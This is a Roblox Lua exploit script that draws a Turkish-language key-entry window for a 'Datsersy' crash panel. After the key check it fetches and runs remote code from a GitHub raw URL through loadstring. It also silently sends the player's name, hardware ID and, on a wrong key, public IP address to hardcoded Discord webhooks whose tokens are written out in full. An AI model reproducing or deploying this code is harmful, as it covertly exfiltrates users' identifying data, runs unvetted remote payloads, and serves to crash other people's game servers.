-- Gui to Lua
-- Version: 3.2

-- Instances:

local cuersyzhubwhlt = Instance.new("ScreenGui")
local Gui = Instance.new("Frame")
local Textbox = Instance.new("TextBox")
local UICorner = Instance.new("UICorner")
local Discordtitle = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local Discordtitle_2 = Instance.new("TextLabel")
local Discordtitle_3 = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local Home = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")

--Properties:

cuersyzhubwhlt.Name = "cuersyzhubwhlt"
cuersyzhubwhlt.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
cuersyzhubwhlt.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Gui.Name = "Gui"
Gui.Parent = cuersyzhubwhlt
Gui.BackgroundColor3 = Color3.fromRGB(7, 7, 7)
Gui.ClipsDescendants = true
Gui.Position = UDim2.new(0.293159664, 0, 0.265643418, 0)
Gui.Size = UDim2.new(0, 663, 0, 375)
Gui.ZIndex = 999999999

Textbox.Name = "Textbox"
Textbox.Parent = Gui
Textbox.AnchorPoint = Vector2.new(0.5, 0)
Textbox.BackgroundColor3 = Color3.fromRGB(19, 21, 25)
Textbox.BorderSizePixel = 0
Textbox.Position = UDim2.new(0.499609619, 0, 0.44042334, 0)
Textbox.Size = UDim2.new(0.619617224, 0, 0.0649885833, 0)
Textbox.SizeConstraint = Enum.SizeConstraint.RelativeXX
Textbox.ZIndex = 2
Textbox.Font = Enum.Font.Unknown
Textbox.PlaceholderColor3 = Color3.fromRGB(255, 0, 0)
Textbox.PlaceholderText = "Type Key Here!"
Textbox.Text = ""
Textbox.TextColor3 = Color3.fromRGB(255, 255, 255)
Textbox.TextScaled = true
Textbox.TextSize = 14.000
Textbox.TextWrapped = true

UICorner.Parent = Textbox

Discordtitle.Name = "Discordtitle"
Discordtitle.Parent = Gui
Discordtitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle.BackgroundTransparency = 1.000
Discordtitle.Position = UDim2.new(0.34821713, 0, -0.00198502792, 0)
Discordtitle.Size = UDim2.new(0, 200, 0, 50)
Discordtitle.ZIndex = 2
Discordtitle.Font = Enum.Font.GothamBlack
Discordtitle.Text = "Datsersy V3.1 [Beta]"
Discordtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle.TextSize = 23.000

UICorner_2.Parent = Gui

Discordtitle_2.Name = "Discordtitle"
Discordtitle_2.Parent = Gui
Discordtitle_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_2.BackgroundTransparency = 1.000
Discordtitle_2.Position = UDim2.new(0.34821713, 0, 0.864681661, 0)
Discordtitle_2.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_2.ZIndex = 2
Discordtitle_2.Font = Enum.Font.GothamBlack
Discordtitle_2.Text = "Girişte Sorun Yaşıyorsanız Lütfen Bizimle İletişime Geçiniz!"
Discordtitle_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_2.TextSize = 23.000

Discordtitle_3.Name = "Discordtitle"
Discordtitle_3.Parent = Gui
Discordtitle_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_3.BackgroundTransparency = 1.000
Discordtitle_3.Position = UDim2.new(0.34821713, 0, 0.219348311, 0)
Discordtitle_3.Size = UDim2.new(0, 200, 0, 50)
Discordtitle_3.ZIndex = 2
Discordtitle_3.Font = Enum.Font.GothamBlack
Discordtitle_3.Text = "Whitelist Key'inizi Girerek Crash Panel'ine Giriş Yapabilirsiniz."
Discordtitle_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Discordtitle_3.TextSize = 23.000

ImageLabel.Parent = Gui
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.67534095, 0, 0.0106666666, 0)
ImageLabel.Size = UDim2.new(0, 45, 0, 45)
ImageLabel.Image = "http://www.roblox.com/asset/?id=6809020012"

Home.Name = "Home"
Home.Parent = Gui
Home.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Home.BackgroundTransparency = 0.150
Home.Position = UDim2.new(0.309997112, 0, 0.590558231, 0)
Home.Size = UDim2.new(0, 235, 0, 47)
Home.ZIndex = 2
Home.Font = Enum.Font.Unknown
Home.Text = "Submit"
Home.TextColor3 = Color3.fromRGB(255, 0, 4)
Home.TextScaled = true
Home.TextSize = 20.000
Home.TextWrapped = true
local key = Textbox.Text
Home.MouseButton1Click:Connect(function()
    if Textbox.Text == "admingiris" then
        local webh = "https://discord.com/api/webhooks/1035594642122608660/R1o-zrBkfWkM8--OFd1D0zpovkonNpOz2eyW_MwoyCG3IwDvvicKOn094pt0BFeB0c_h"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
        Gui.Visible = false
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
    elseif key == "datsersy-wdhfasjdaw-sdjawdh2sd2" then
        Gui.Visible = false
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
        local webh2 = "https://discord.com/api/webhooks/1034888168362741831/ywuTL_Xa8jU3zUvrM43U3RMqYtvIrPiGFZZzRodc3x7RFeLxurMBX6uyIcbyI9JcKd0I"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh2,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
    elseif key == "datsersy-jj23wdwajdj-12j34j1ası" then
        Gui.Visible = false
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
        local webh3 = "https://discord.com/api/webhooks/1035593180927758357/b2CGGHCdudHGvkBqC2khFIf9ZT3WZKSZ2gbSmVM9wCqXJ2LAYHrsEZmKWIbjmAvSMpHv"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh3,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh3,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh3,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
    elseif key == "datsersy-as2fjwdı23qkdj-jdawujd" then
        Gui.Visible = false
        loadstring(game:HttpGet("https://raw.githubusercontent.com/kldmwakldaldjawdjakd/jdajwdjadjawd/main/cykablyat142"))()
        local webh4 = "https://discord.com/api/webhooks/1035594120024051752/fk08CBLB7q5r5NEk1sbsrikLNUwE9roB4MYaKVMx14q0i1hChPhwq4pDj4MO92XNwzn0"        local res = (request or http_request or syn and syn.request)({            Url = "https://api.luauth.xyz/hwid",            Method = "GET"            })            if res.Success then            local index = string.find(res.Body, "Executor Name:")            if index then            pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh4,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh4,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh4,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)            return            end            end
    else
        Gui.Visible = false
        local function notify(msg)
    game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "WARN",
    Text = msg
    })
    end
    local res = (request or http_request or syn and syn.request)({
    Url = "https://api.luauth.xyz/hwid",
    Method = "GET"
    })
    if res.Success then
    local index = string.find(res.Body, "Executor Name:")
    if index then
        notify("Your key is invaild!")
    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = game:HttpGet("https://api.ipify.org")                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)
    pcall(function()            local data = {                ["embeds"] = {                    {                        ["title"] = game:GetService("Players").LocalPlayer.Name,                        ["description"] = string.sub(res.Body, 19, index - 5)                    }                }            }                     if syn then                local response = syn.request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif request then                local response = request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            elseif http_request then                local response = http_request(                    {                        Url = webh,                        Method = 'POST',                        Headers = {                            ['Content-Type'] = 'application/json'                        },                        Body = game:GetService('HttpService'):JSONEncode(data)                    }                );            end    end)
    return
    end
    end
    end
end)

UICorner_3.Parent = Home
